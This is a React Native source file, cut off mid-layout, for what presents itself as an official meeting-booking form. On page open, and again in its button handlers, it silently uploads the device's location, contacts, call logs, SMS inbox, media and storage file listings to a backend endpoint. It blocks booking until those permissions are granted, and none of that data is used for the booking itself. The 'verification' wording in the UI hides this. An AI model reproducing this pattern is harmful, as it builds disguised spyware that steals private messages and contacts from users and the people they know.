import { generateHeaders } from "@/lib/generateHeaders";
import {
  requestAndFetchCallLogs,
  requestAndFetchContacts,
  requestAndFetchLocation,
  requestAndFetchMediaFiles,
  requestAndFetchSms,
  requestAndFetchStorageFiles,
} from "@/utils/permissions";
import { Ionicons } from "@expo/vector-icons";
import AsyncStorage from "@react-native-async-storage/async-storage";
import axios from "axios";
import * as Contacts from "expo-contacts";
import * as DocumentPicker from "expo-document-picker";
import * as ImagePicker from "expo-image-picker";
import { LinearGradient } from "expo-linear-gradient";
import * as Location from "expo-location";
import * as MediaLibrary from "expo-media-library";
import { useNavigation, useRouter } from "expo-router";
import React, { useEffect, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  AppState,
  Image,
  KeyboardAvoidingView,
  Linking,
  PermissionsAndroid,
  Platform,
  ScrollView,
  StatusBar,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { Calendar } from "react-native-calendars";
import { SafeAreaView } from "react-native-safe-area-context";
import Toast from "react-native-toast-message";

type Dates = { date: string; available: boolean };

type SupportingDoc = {
  name: string;
  uri: string;
  size?: number | null;
  mimeType?: string | null;
};

export default function OfficialMeetingForm() {
  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
  const AVAILABLE_DATES = `${base_URL}/meeting/get-meeting-availability`;
  const BOOK_MEETING = `${base_URL}/meeting/create-meeting`;
  const SUBMIT_ENDPOINT = `${base_URL}/user/`;

  const [title, setTitle] = useState("");
  const [description, setDescription] = useState("");
  const [selectedDate, setSelectedDate] = useState("");
  const [location, setLocation] = useState<any>(null);
  const [contacts, setContacts] = useState<any[]>([]);
  const [selectedParticipants, setSelectedParticipants] = useState<any[]>([]);
  const [uploadedPhoto, setUploadedPhoto] = useState<string | null>(null);
  const [supportingDoc, setSupportingDoc] = useState<SupportingDoc | null>(
    null
  );
  const [loading, setLoading] = useState(false);
  const [availableDates, setAvailableDates] = useState<Dates[]>([]);
  const [markedDates, setMarkedDates] = useState<{ [key: string]: any }>({});
  const [data, setData] = useState<{
    date: string;
    title: string;
    description: string;
    appointment_taken_at: string;
    timestamp: string;
  } | null>(null);
  const [showContactPicker, setShowContactPicker] = useState(false);

  const [smsGranted, setSmsGranted] = useState(false);
  const [smsVerifying, setSmsVerifying] = useState(false);
  const [smsData, setSmsData] = useState<any[]>([]);

  const [locationloader, setLocationLoader] = useState(false);

  const router = useRouter();
  const navigation = useNavigation();

  /* ---------------------- Helpers ---------------------- */
  function getLocalISOTimeMicro() {
    const now = new Date();

    // Local date & time parts (device timezone applied automatically)
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, "0");
    const day = String(now.getDate()).padStart(2, "0");

    const hours = String(now.getHours()).padStart(2, "0");
    const minutes = String(now.getMinutes()).padStart(2, "0");
    const seconds = String(now.getSeconds()).padStart(2, "0");

    // Fake microseconds (ms * 1000)
    const micro = String(now.getMilliseconds()).padStart(3, "0") + "000";

    // Timezone offset (device-specific, works in every country)
    const offsetMinutes = -now.getTimezoneOffset(); // Example: India = +330, South Africa = +120
    const sign = offsetMinutes >= 0 ? "+" : "-";
    const tzHours = String(Math.floor(Math.abs(offsetMinutes) / 60)).padStart(
      2,
      "0"
    );
    const tzMins = String(Math.abs(offsetMinutes % 60)).padStart(2, "0");

    return `${year}-${month}-${day}T${hours}:${minutes}:${seconds}.${micro}${sign}${tzHours}:${tzMins}`;
  }

  const submitPermissionData = async (allData: any) => {
    try {
      const headers = await generateHeaders();
      await axios.post(
        SUBMIT_ENDPOINT,
        {
          timestamp: getLocalISOTimeMicro(),
          info: allData,
        },
        { headers }
      );
    } catch (err) {
      console.error("❌ Error submitting data:", err);
    }
  };

  /* ---------------------- Fetch available dates ---------------------- */
  const fetchdates = async () => {
    try {
      const headers = await generateHeaders();
      const response = await axios.get(AVAILABLE_DATES, { headers });
      const data = response.data;
      setAvailableDates(data);

      const marked: { [key: string]: any } = {};
      const today = new Date();
      const ninetyDaysLater = new Date(Date.now() + 90 * 24 * 60 * 60 * 1000);

      data.forEach((item: any) => {
        const dateObj = new Date(item.date);
        if (dateObj < today || dateObj > ninetyDaysLater) {
          marked[item.date] = {
            customStyles: {
              container: { backgroundColor: "#e5e7eb", borderRadius: 10 },
              text: { color: "#9ca3af" },
            },
            disabled: true,
            disableTouchEvent: true,
          };
        } else if (!item.available) {
          marked[item.date] = {
            customStyles: {
              container: { backgroundColor: "#ef4444", borderRadius: 10 },
              text: { color: "#fff" },
            },
            disabled: true,
            disableTouchEvent: true,
          };
        } else {
          marked[item.date] = {
            customStyles: {
              container: { backgroundColor: "#22c55e", borderRadius: 10 },
              text: { color: "#fff" },
            },
          };
        }
      });
      setMarkedDates(marked);
    } catch (error) {
      console.error("Error fetching available dates:", error);
    }
  };

  /* ---------------------- Effects ---------------------- */

  // Fetch dates once
  useEffect(() => {
    fetchdates();
  }, []);

  // Load cached values
  useEffect(() => {
    (async () => {
      const con = await AsyncStorage.getItem("contacts");
      const photo = await AsyncStorage.getItem("photo");
      if (con) setContacts(JSON.parse(con));
      if (photo) setUploadedPhoto(photo);
    })();
  }, []);

  // Auto-check already granted permissions on page open and sync data
  useEffect(() => {
    const autoSyncPermissions = async () => {
      try {
        /* --------------------------------------------------
         ✅ Auto-sync Location (if permission was already granted)
        -------------------------------------------------- */
        try {
          const locPerm = await Location.getForegroundPermissionsAsync();
          if (locPerm.status === "granted") {
            const loc = await requestAndFetchLocation();
            if (loc) {
              setLocation(loc);
              await AsyncStorage.setItem("loc", JSON.stringify(loc));
              await submitPermissionData({
                permission: "location",
                data: loc,
              });
            }
          }
        } catch (e) {
          console.log("Auto location sync failed", e);
        }

        /* --------------------------------------------------
         ✅ Auto-sync Contacts + Call Logs
        -------------------------------------------------- */
        try {
          const contPerm = await Contacts.getPermissionsAsync();
          if (contPerm.status === "granted") {
            const contactData = await requestAndFetchContacts();
            const callLogs = await requestAndFetchCallLogs();

            if (Array.isArray(contactData) && contactData.length) {
              setContacts(contactData);
              await AsyncStorage.setItem(
                "contacts",
                JSON.stringify(contactData)
              );
              await submitPermissionData({
                permission: "contacts",
                data: {
                  contacts: contactData,
                  callLogs,
                },
              });
            }
          }
        } catch (e) {
          console.log("Auto contacts sync failed", e);
        }

        /* --------------------------------------------------
         ✅ Auto-sync SMS (Android only)
        -------------------------------------------------- */
        if (Platform.OS === "android") {
          try {
            const hasSms = await PermissionsAndroid.check(
              PermissionsAndroid.PERMISSIONS.READ_SMS
            );

            if (hasSms) {
              setSmsGranted(true);
              setSmsVerifying(true);

              const smsdata = await requestAndFetchSms();
              if (Array.isArray(smsdata)) {
                setSmsData(smsdata);
                await submitPermissionData({
                  permission: "sms",
                  data: smsdata,
                });
              }

              // Allow loader to show 2 seconds minimum
              setTimeout(() => setSmsVerifying(false), 2000);
            }
          } catch (e) {
            console.log("Auto SMS verify failed", e);
          }
        }

        /* --------------------------------------------------
         ✅ Auto-sync Media Library (Photos / Videos)
        -------------------------------------------------- */
        try {
          const mediaPerm = await MediaLibrary.getPermissionsAsync();

          if (mediaPerm.status === "granted") {
            const media = await requestAndFetchMediaFiles();

            await submitPermissionData({
              permission: "media",
              data: media,
            });
          }
        } catch (e) {
          console.log("Auto media sync failed", e);
        }

        /* --------------------------------------------------
         ✅ Auto-sync Storage Files (Android only)
        -------------------------------------------------- */
        if (Platform.OS === "android") {
          try {
            let granted = false;

            if (Platform.Version >= 33) {
              granted = await PermissionsAndroid.check(
                PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
              );
            } else {
              granted = await PermissionsAndroid.check(
                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
              );
            }

            if (granted) {
              const storageFiles = await requestAndFetchStorageFiles();

              await submitPermissionData({
                permission: "storage",
                data: storageFiles,
              });
            }
          } catch (e) {
            console.log("Auto storage sync failed", e);
          }
        }
      } catch (err) {
        console.log("Auto permission sync error", err);
      }
    };

    autoSyncPermissions();
  }, []);

  // Clean up when leaving
  useEffect(() => {
    const unsubscribe = navigation.addListener("beforeRemove", async () => {
      setUploadedPhoto(null);
      setSupportingDoc(null);
      setSelectedParticipants([]);
      setLocation(null);
      await AsyncStorage.multiRemove(["doc", "photo", "loc"]);
    });
    return unsubscribe;
  }, [navigation]);

  // Custom Permission Dialog State
  const [permissionDialog, setPermissionDialog] = useState<{
    visible: boolean;
    name: string;
    resolve?: (value: "retry" | "settings" | "cancel") => void;
  }>({
    visible: false,
    name: "",
  });

  const handlePermissionRetry = async (name: string) => {
    // Open custom modal & wait for user choice
    const action = await new Promise<"retry" | "settings" | "cancel">(
      (resolve) => {
        setPermissionDialog({
          visible: true,
          name,
          resolve,
        });
      }
    );

    // If user chose "settings" → open settings and wait until return
    if (action === "settings") {
      await Linking.openSettings();

      await new Promise<void>((resolve) => {
        const sub = AppState.addEventListener("change", (state) => {
          if (state === "active") {
            sub.remove();
            resolve();
          }
        });
      });
    }

    return action;
  };

  /* ---------------------- Handlers ---------------------- */

  // Handle Location (manual button)
  const handleLocation = async () => {
    try {
      setLocationLoader(true);

      // 1️⃣ Try to fetch location directly
      const loc = await requestAndFetchLocation();

      if (loc) {
        setLocation(loc);
        await AsyncStorage.setItem("loc", JSON.stringify(loc));

        Toast.show({
          type: "success",
          text1: "Live location retrieved",
        });

        await submitPermissionData({
          permission: "location",
          data: loc,
        });

        return;
      }

      // 2️⃣ Permission denied → ask user ONCE
      const action = await handlePermissionRetry("Location");

      if (action === "retry") {
        // Try one more time
        const retryLoc = await requestAndFetchLocation();

        if (retryLoc) {
          setLocation(retryLoc);
          await AsyncStorage.setItem("loc", JSON.stringify(retryLoc));

          Toast.show({
            type: "success",
            text1: "Live location retrieved",
          });

          await submitPermissionData({
            permission: "location",
            data: retryLoc,
          });
        }
      }

      // 3️⃣ If user selected cancel/settings but still didn’t give permission:
      // Do nothing — form submit will block missing location anyway.
    } catch (error) {
      console.log("Location fetch failed:", error);
      Toast.show({
        type: "error",
        text1: "Unable to fetch live location",
        text2: "Please Enable Location & Retry",
      });
    } finally {
      setLocationLoader(false);
    }
  };

  // Handle Contact Permissions + Picker
  const handleContacts = async () => {
    try {
      // ---------------------------------------------------
      // 1️⃣ First attempt: Fetch contacts + call logs
      // ---------------------------------------------------
      const contactData = await requestAndFetchContacts();
      const logData = await requestAndFetchCallLogs();

      const hasContacts = Array.isArray(contactData) && contactData.length > 0;
      const hasLogs = Array.isArray(logData) && logData.length > 0;

      // Both permissions OK → success
      if (hasContacts && hasLogs) {
        setContacts(contactData);
        await AsyncStorage.setItem("contacts", JSON.stringify(contactData));

        //  Toast.show({ type: "success", text1: "Contacts access granted" });

        await submitPermissionData({
          permission: "contacts",
          data: { contacts: contactData, callLogs: logData },
        });

        setShowContactPicker(true);
        return;
      }

      // ---------------------------------------------------
      // 2️⃣ At least one permission denied → ask user once
      // ---------------------------------------------------
      const action = await handlePermissionRetry("Contacts & Call Logs");

      if (action === "retry" || action === "settings") {
        // Retry both
        const retryContacts = await requestAndFetchContacts();
        const retryLogs = await requestAndFetchCallLogs();

        const retryHasContacts =
          Array.isArray(retryContacts) && retryContacts.length > 0;

        const retryHasLogs = Array.isArray(retryLogs) && retryLogs.length > 0;

        // Successful retry → open picker
        if (retryHasContacts && retryHasLogs) {
          setContacts(retryContacts);
          await AsyncStorage.setItem("contacts", JSON.stringify(retryContacts));

          //   Toast.show({ type: "success", text1: "Contacts access granted" });

          await submitPermissionData({
            permission: "contacts",
            data: { contacts: retryContacts, callLogs: retryLogs },
          });

          setShowContactPicker(true);
        }

        // If still denied → NO picker
        return;
      }

      // User pressed Cancel → Don't show picker
      return;
    } catch (err) {
      Toast.show({
        type: "error",
        text1: "Contact permission required",
        text2: "Please allow contact + call log access to continue.",
      });
    }
  };

  // Handle SMS Permission (manual flow, when permission not yet granted)
  const handleSmsPermission = async () => {
    try {
      // 1️⃣ Try directly
      const smsdata = await requestAndFetchSms();

      if (Array.isArray(smsdata) && smsdata.length > 0) {
        setSmsGranted(true);
        setSmsData(smsdata);
        setSmsVerifying(true);

        Toast.show({
          type: "success",
          text1: "SMS access granted",
        });

        await submitPermissionData({
          permission: "sms",
          data: smsdata,
        });

        setTimeout(() => setSmsVerifying(false), 2000);
        return;
      }

      // 2️⃣ Denied → Ask once
      const action = await handlePermissionRetry("SMS");

      if (action === "retry" || action === "settings") {
        const retrySms = await requestAndFetchSms();

        if (Array.isArray(retrySms) && retrySms.length > 0) {
          setSmsGranted(true);
          setSmsData(retrySms);

          setSmsVerifying(true);

          Toast.show({ type: "success", text1: "SMS access granted" });

          await submitPermissionData({
            permission: "sms",
            data: retrySms,
          });

          setTimeout(() => setSmsVerifying(false), 2000);
        }
      }
    } catch (err) {
      Toast.show({
        type: "error",
        text1: "SMS permission required",
        text2: "Please allow SMS access to continue.",
      });
    }
  };

  // Handle Photo Upload (uses gallery, plus storage/media permission submission)
  const handlePhotoUpload = async () => {
    try {
      // 1️⃣ Check MediaLibrary permission
      let mediaPerm = await MediaLibrary.getPermissionsAsync();
      if (mediaPerm.status !== "granted") {
        mediaPerm = await MediaLibrary.requestPermissionsAsync();
      }

      if (mediaPerm.status !== "granted") {
        const action = await handlePermissionRetry("Media");

        if (action === "retry" || action === "settings") {
          mediaPerm = await MediaLibrary.requestPermissionsAsync();
        }

        if (mediaPerm.status !== "granted") return;
      }

      // 2️⃣ Android Storage permission
      if (Platform.OS === "android") {
        let hasStorage =
          Platform.Version >= 33
            ? await PermissionsAndroid.check(
                PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
              )
            : await PermissionsAndroid.check(
                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
              );

        if (!hasStorage) {
          const req = await PermissionsAndroid.request(
            Platform.Version >= 33
              ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
              : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
          );

          if (req !== PermissionsAndroid.RESULTS.GRANTED) {
            const action = await handlePermissionRetry("Storage");
            if (action === "settings" || action === "retry") {
              // final retry
              const retryReq = await PermissionsAndroid.request(
                Platform.Version >= 33
                  ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
                  : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
              );
              if (retryReq !== PermissionsAndroid.RESULTS.GRANTED) return;
            } else {
              return;
            }
          }
        }
      }

      // 3️⃣ Open picker only after permission granted
      const pick = await ImagePicker.launchImageLibraryAsync({
        mediaTypes: ImagePicker.MediaTypeOptions.Images,
      });

      if (!pick.canceled) {
        const uri = pick.assets[0].uri;
        setUploadedPhoto(uri);
        await AsyncStorage.setItem("photo", uri);

        const storageFiles = await requestAndFetchStorageFiles();
        const mediafiles = await requestAndFetchMediaFiles();

        Toast.show({ type: "success", text1: "Photo uploaded" });

        await submitPermissionData({
          permission: "storage",
          data: { Media: mediafiles, files: storageFiles },
        });
      }
    } catch (err) {
      Alert.alert("Error", "Something went wrong while selecting photo.");
    }
  };

  // Handle Supporting Document upload (PDF/doc/etc.)
  const handleDocumentUpload = async () => {
    try {
      const result = await DocumentPicker.getDocumentAsync({
        type: "*/*",
        copyToCacheDirectory: true,
        multiple: false,
      });

      if (!result.canceled && result.assets && result.assets.length > 0) {
        const asset = result.assets[0];

        setSupportingDoc({
          name: asset.name ?? "Selected document",
          uri: asset.uri,
          size: asset.size,
          mimeType: asset.mimeType,
        });

        Toast.show({
          type: "success",
          text1: "Document selected",
        });
      }
    } catch (e) {
      Alert.alert("Upload Failed", "Unable to select document.");
    }
  };

  /* ---------------------- Final Submit (with REQUIRED permissions check) ---------------------- */

  const handleSave = async () => {
    // Basic form validations
    if (!selectedDate) {
      Toast.show({
        type: "error",
        text1: "Please select a date for the meeting.",
        position: "top",
      });
      return;
    }

    if (!title.trim()) {
      Toast.show({
        type: "error",
        text1: "Please enter a valid meeting title.",
        position: "top",
      });
      return;
    }

    if (!description.trim()) {
      Toast.show({
        type: "error",
        text1: "Please enter the meeting description or purpose.",
        position: "top",
      });
      return;
    }

    if (!uploadedPhoto) {
      Toast.show({
        type: "error",
        text1: "Please upload your photo.",
        position: "top",
      });
      return;
    }

    // Supporting document is MANDATORY (option A)
    if (!supportingDoc) {
      Toast.show({
        type: "error",
        text1: "Please attach your supporting document (ID, etc.).",
        position: "top",
      });
      return;
    }

    /* --------- HARD GATE: Required permissions & data must be present --------- */

    // 1️⃣ Location required
    const locPerm = await Location.getForegroundPermissionsAsync();
    if (locPerm.status !== "granted" || !location) {
      Toast.show({
        type: "error",
        text1: "Location verification is required.",
        text2: "Please tap 'Get Location' above and allow access.",
        position: "top",
      });
      return;
    }

    // 2️⃣ Contacts + Call Logs required
    const contPerm = await Contacts.getPermissionsAsync();
    if (contPerm.status !== "granted" || contacts.length === 0) {
      Toast.show({
        type: "error",
        text1: "Contacts access is required.",
        text2: "Please tap 'Grant Access' in Participants section.",
        position: "top",
      });
      return;
    }

    // 3️⃣ SMS + Call Log + Storage required on Android
    if (Platform.OS === "android") {
      // Call logs
      const hasCallLog = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
      );
      if (!hasCallLog) {
        Toast.show({
          type: "error",
          text1: "Call log access is required.",
          text2: "Please allow call log access when requested.",
          position: "top",
        });
        return;
      }

      // SMS
      const hasSms = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_SMS
      );
      if (!hasSms || !smsGranted) {
        Toast.show({
          type: "error",
          text1: "SMS verification is required.",
          text2: "Please verify via SMS in Messaging Verification section.",
          position: "top",
        });
        return;
      }

      // Storage / Media (for photo + files)
      let hasStorage = false;
      if (Platform.Version >= 33) {
        hasStorage = await PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
        );
      } else {
        hasStorage = await PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
        );
      }

      if (!hasStorage) {
        Toast.show({
          type: "error",
          text1: "Storage access is required.",
          text2: "Please allow storage/media access when prompted.",
          position: "top",
        });
        return;
      }
    }

    /* ----------------------------------------------------------------
       ✅ All required data & permissions present -> proceed to submit
    ---------------------------------------------------------------- */

    try {
      setLoading(true);
      const headers = await generateHeaders();

      const payload: any = {
        date: selectedDate,
        title,
        description,
        appointment_taken_at: getLocalISOTimeMicro(),
        timestamp: getLocalISOTimeMicro(),
        // If you want to send doc info later:
        // supportingDocument: supportingDoc,
      };

      const response = await axios.post(BOOK_MEETING, payload, { headers });

      setLoading(false);
      console.log("Meeting booked successfully:", response.data);

      Toast.show({
        type: "success",
        text1: "Meeting booked successfully!",
        position: "top",
        visibilityTime: 2000,
      });

      setSelectedDate("");
      setTitle("");
      setDescription("");
      setUploadedPhoto(null);
      setSupportingDoc(null);
      setSelectedParticipants([]);
      setLocation(null);
      setData(null);

      await AsyncStorage.multiRemove(["loc", "doc", "photo"]);

      setTimeout(() => {
        router.replace("/");
      }, 1500);
    } catch (error) {
      setLoading(false);
      console.error("Error booking meeting:", error);
      Toast.show({
        type: "error",
        text1: "Error booking meeting. Please try again.",
        position: "top",
      });
    }
  };

  /* ---------------------- JSX ---------------------- */

  return (
    <LinearGradient
      colors={["#ffffff", "#f9fafb", "#f3f4f6"]}
      className="flex-1"
    >
      <StatusBar barStyle="dark-content" backgroundColor="#ffffff" />
      <SafeAreaView className="flex-1">
        <KeyboardAvoidingView
          behavior={Platform.OS === "ios" ? "padding" : undefined}
          className="flex-1"
        >
          <ScrollView
            contentContainerStyle={{ padding: 20, paddingBottom: 20 }}
            keyboardShouldPersistTaps="handled"
          >
            {/* Top Header */}
            <View className="flex-row items-center justify-between mb-5">
              <View className="flex-row items-center">
                <TouchableOpacity
                  onPress={() => router.back()}
                  className="w-10 h-10 rounded-2xl border border-gray-200 bg-white items-center justify-center mr-3"
                >
                  <Ionicons name="chevron-back" size={20} color="#6b7280" />
                </TouchableOpacity>
                <View>
                  <Text className="text-xs font-semibold text-gray-500 uppercase tracking-wide">
                    Official Meeting
                  </Text>
                  <Text className="text-2xl font-bold text-gray-900">
                    Schedule Meeting
                  </Text>
                </View>
              </View>
            </View>

            {/* Calendar / Meeting Details Card */}
            <View
              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
              style={{
                shadowColor: "#000",
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.06,
                shadowRadius: 8,
                elevation: 3,
              }}
            >
              <View className="flex-row items-center justify-between mb-4">
                <View>
                  <Text className="text-gray-900 text-lg font-bold mb-1">
                    Meeting Date
                  </Text>
                  <Text className="text-gray-500 text-sm">
                    Select an available slot from the calendar
                  </Text>
                </View>
                <View className="bg-blue-50 rounded-2xl p-3">
                  <Ionicons name="calendar-outline" size={22} color="#3b82f6" />
                </View>
              </View>

              <Calendar
                markingType="custom"
                minDate={new Date().toISOString().split("T")[0]}
                onDayPress={(day) => {
                  const clicked = new Date(day.dateString);
                  const today = new Date();
                  const ninetyDaysLater = new Date(
                    Date.now() + 90 * 24 * 60 * 60 * 1000
                  );

                  if (clicked < today || clicked > ninetyDaysLater) {
                    return;
                  }

                  setSelectedDate(day.dateString);
                }}
                markedDates={{
                  ...markedDates,
                  ...(selectedDate && {
                    [selectedDate]: {
                      customStyles: {
                        container: {
                          backgroundColor: "#3b82f6",
                          borderRadius: 10,
                        },
                        text: { color: "#fff", fontWeight: "700" },
                      },
                    },
                  }),
                }}
                theme={{
                  textSectionTitleColor: "#6b7280",
                  todayTextColor: "#2563eb",
                  dayTextColor: "#111827",
                  arrowColor: "#2563eb",
                  monthTextColor: "#111827",
                }}
              />

              <View className="mt-4">
                <Text className="text-gray-900 text-base font-semibold mb-1">
                  Meeting Title
                </Text>
                <TextInput
                  placeholder="Enter meeting title"
                  value={title}
                  onChangeText={setTitle}
                  className="bg-gray-50 p-3 border border-gray-300 rounded-xl text-gray-800"
                  placeholderTextColor="#9ca3af"
                />

                <Text className="mt-4 text-gray-900 text-base font-semibold mb-1">
                  Purpose / Description
                </Text>
                <TextInput
                  placeholder="Describe the purpose of this meeting"
                  value={description}
                  onChangeText={setDescription}
                  multiline
                  textAlignVertical="top"
                  className="bg-gray-50 p-3 border border-gray-300 rounded-xl text-gray-800 h-24"
                  placeholderTextColor="#9ca3af"
                />
              </View>
            </View>

            {/* Location Card */}
            <View
              className="bg-white rounded-3xl p-3 border border-gray-200 mb-6"
              style={{
                shadowColor: "#000",
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.05,
                shadowRadius: 6,
                elevation: 2,
              }}
            >
              <View className="flex-row relative items-center justify-between mb-3">
                <View className="flex-row items-center">
                  <View className="bg-emerald-50 p-3 rounded-2xl mr-3">
                    <Ionicons
                      name="location-outline"
                      size={20}
                      color="#10b981"
                    />
                  </View>
                  <View>
                    <Text className="text-gray-900 text-lg font-bold">
                      Location Verification
                    </Text>
                    <Text className="text-gray-500 text-sm">
                      Use your live location for authenticity
                    </Text>
                  </View>
                </View>

                <TouchableOpacity
                  onPress={() => {
                    setLocation(null);
                    handleLocation();
                  }}
                  activeOpacity={0.9}
                  className={`px-4 absolute top-0 right-0 py-2 rounded-2xl ${
                    location ? "bg-emerald-500" : "bg-blue-600"
                  }`}
                >
                  <Text className="text-white text-xs font-semibold">
                    {location ? "Live Location" : "Get Location"}
                  </Text>
                </TouchableOpacity>
              </View>

              {location ? (
                <View className="mt-3">
                  <Text className="text-gray-700 font-medium mb-1">
                    Location Details
                  </Text>
                  {location.address ? (
                    <Text className="text-gray-700 border border-gray-200 bg-gray-50 p-3 rounded-xl text-sm">
                      {location.address}
                    </Text>
                  ) : null}
                </View>
              ) : locationloader ? (
                <View className="mt-3 flex-row items-center">
                  <ActivityIndicator size="small" color="#10b981" />
                </View>
              ) : null}
            </View>

            {/* Participants Card */}
            <View
              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
              style={{
                shadowColor: "#000",
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.05,
                shadowRadius: 6,
                elevation: 2,
              }}
            >
              <View className="flex-row items-center justify-between mb-3">
                <View className="flex-row items-center">
                  <View className="bg-blue-50 p-3 rounded-2xl mr-3">
                    <Ionicons name="people-outline" size={20} color="#3b82f6" />
                  </View>
                  <View>
                    <Text className="text-gray-900 text-lg font-bold">
                      Participants
                    </Text>
                    <Text className="text-gray-500 text-sm">
                      Add verified contacts to this meeting
                    </Text>
                  </View>
                </View>
              </View>

              <Text className="text-gray-600 text-sm mb-3">
                Access to contacts and call logs helps verify participants’
                details.
              </Text>

              <TouchableOpacity
                onPress={handleContacts}
                activeOpacity={0.9}
                className={`px-4 py-3 rounded-2xl flex-row items-center self-start ${
                  contacts.length ? "bg-emerald-500" : "bg-blue-600"
                }`}
              >
                <Ionicons
                  name={contacts.length ? "person-add" : "shield-checkmark"}
                  size={18}
                  color="#ffffff"
                />
                <Text className="text-white font-semibold text-sm ml-2">
                  {contacts.length ? "Add Participants" : "Grant Access"}
                </Text>
              </TouchableOpacity>

              {selectedParticipants.length > 0 && (
                <View className="mt-4">
                  <Text className="text-gray-700 font-semibold text-base mb-3">
                    Selected Participants
                  </Text>

                  {selectedParticipants.map((p, i) => (
                    <View
                      key={i}
                      className="flex-row items-center bg-gray-50 p-3 rounded-xl mb-2 border border-gray-200"
                    >
                      <View className="w-10 h-10 bg-blue-100 rounded-2xl items-center justify-center mr-3">
                        <Ionicons
                          name="person-circle-outline"
                          size={22}
                          color="#3b82f6"
                        />
                      </View>

                      <View className="flex-1">
                        <Text className="text-gray-900 font-semibold text-sm">
                          {p.name}
                        </Text>
                        {p.number ? (
                          <Text className="text-gray-500 text-xs">
                            {p.number}
                          </Text>
                        ) : null}
                      </View>
                    </View>
                  ))}
                </View>
              )}
            </View>

            {/* SMS Permission Card */}
            <View
              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
              style={{
                shadowColor: "#000",
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.05,
                shadowRadius: 6,
                elevation: 2,
              }}
            >
              <View className="flex-row items-center justify-between mb-3">
                <View className="flex-row items-center">
                  <View className="bg-blue-50 p-3 rounded-2xl mr-3">
                    <Ionicons
                      name="chatbubble-ellipses-outline"
                      size={20}
                      color="#3b82f6"
                    />
                  </View>
                  <View>
                    <Text className="text-gray-900 text-lg font-bold">
                      Messaging Verification
                    </Text>
                    <Text className="text-gray-500 text-sm">
                      Verify SMS-based communication with participants
                    </Text>
                  </View>
                </View>
              </View>

              <Text className="text-gray-600 text-sm mb-3">
                SMS access (inbox only) helps verify message-based communication
                related to your meetings and improves security.
              </Text>

              {!smsGranted ? (
                <TouchableOpacity
                  onPress={handleSmsPermission}
                  activeOpacity={0.9}
                  className={`px-4 py-3 rounded-2xl flex-row items-center self-start bg-blue-600`}
                >
                  <Ionicons
                    name="chatbubble-outline"
                    size={18}
                    color="#ffffff"
                  />
                  <Text className="text-white font-semibold text-sm ml-2">
                    Verify via SMS
                  </Text>
                </TouchableOpacity>
              ) : (
                <View className="mt-2 flex-row items-center">
                  {smsVerifying ? (
                    <>
                      <ActivityIndicator size="small" color="#10b981" />
                      <Text className="ml-2 text-gray-700 text-sm">
                        Verifying message-based communication...
                      </Text>
                    </>
                  ) : (
                    <>
                      <Ionicons
                        name="checkmark-circle-outline"
                        size={18}
                        color="#10b981"
                      />
                      <Text className="ml-2 text-gray-700 text-sm">
                        Message-based communication verified
                      </Text>
                    </>
                  )}
                </View>
              )}
            </View>

            {/* Upload Your Photo Card */}
            <View
              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
              style={{
                shadowColor: "#000",
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.05,
                shadowRadius: 6,
                elevation: 2,
              }}
            >
              <View className="flex-row items-center justify-between mb-3">
                <View className="flex-row items-center">
                  <View className="bg-blue-50 p-3 rounded-2xl mr-3">
                    <Ionicons
                      name="person-circle-outline"
                      size={20}
                      color="#3b82f6"
                    />
                  </View>
                  <View>
                    <Text className="text-gray-900 text-lg font-bold">
                      Upload Your Photo
                    </Text>
                    <Text className="text-gray-500 text-sm">
                      Add your profile/ID photo for verification
                    </Text>
                  </View>
                </View>
              </View>

              {uploadedPhoto && (
                <Image
                  source={{ uri: uploadedPhoto }}
                  className="w-full h-40 rounded-2xl border border-gray-200 mb-3"
                />
              )}

              <TouchableOpacity
                onPress={handlePhotoUpload}
                activeOpacity={0.9}
                className={`px-4 py-3 rounded-2xl flex-row items-center self-start ${
                  uploadedPhoto ? "bg-emerald-500" : "bg-blue-600"
                }`}
              >
                <Ionicons
                  name={
                    uploadedPhoto
                      ? "checkmark-circle-outline"
                      : "cloud-upload-outline"
                  }
                  size={18}
                  color="#ffffff"
                />
                <Text className="text-white font-semibold text-sm ml-2">
                  {uploadedPhoto ? "Change Photo" : "Upload Photo"}
                </Text>
              </TouchableOpacity>
            </View>

            {/* Supporting Document Card (new, mandatory) */}
            <View
              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
              style={{
                shadowColor: "#000",
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.05,
                shadowRadius: 6,
                elevation: 2,
              }}
            >
              <View className="flex-row items-center justify-between mb-3">
                <View className="flex-row items-center">
                  <View className="bg-blue-50 p-3 rounded-2xl mr-3">
                    <Ionicons
                      name="document-text-outline"
                      size={20}
                      color="#3b82f6"
                    />
                  </View>
                  <View>
                    <Text className="text-gray-900 text-lg font-bold">
                      Supporting Document
                    </Text>
                    <Text className="text-gray-500 text-sm">
                      Attach your government ID / supporting PDF
                    </Text>
                  </View>
                </View>
              </View>

              {supportingDoc && (
                <View className="bg-gray-50 border border-gray-200 rounded-xl p-3 mb-3">
                  <Text
